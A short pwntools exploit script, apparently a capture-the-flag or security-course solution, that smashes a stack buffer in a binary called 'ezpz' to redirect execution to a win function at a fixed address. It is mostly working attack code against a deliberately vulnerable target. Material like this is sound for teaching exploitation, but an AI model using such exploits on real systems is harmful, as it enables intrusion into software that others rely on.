"""
MD5 of Binary: 8ebc3319c746550903ab2f1cbfb284a7

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
"""

'''
The program reads in 0xFE bytes in underflow, and writes those bytes in overflow.
However, the buffer written to in overflow is less than 0xFE bytes.
Buffer overflow attack!
'''

from pwn import *
import re

p = process("./ezpz")
# p = remote('plsdonthaq.me', 24103)

# Underflow gets 0xFE 254 / bytes, storing it into some_buffer (0x100 big)
# Overflow pushes the buffer to the stack and copies the entire buffer into ebp-0x7f
# Overflow!!!!

win_addr = 0x8049273

payload = b''
payload += b'.' * (0x7F + 4)
payload += p32(win_addr)

p.sendline(b'U')
p.sendline(payload)
p.sendline(b'O')

p.interactive()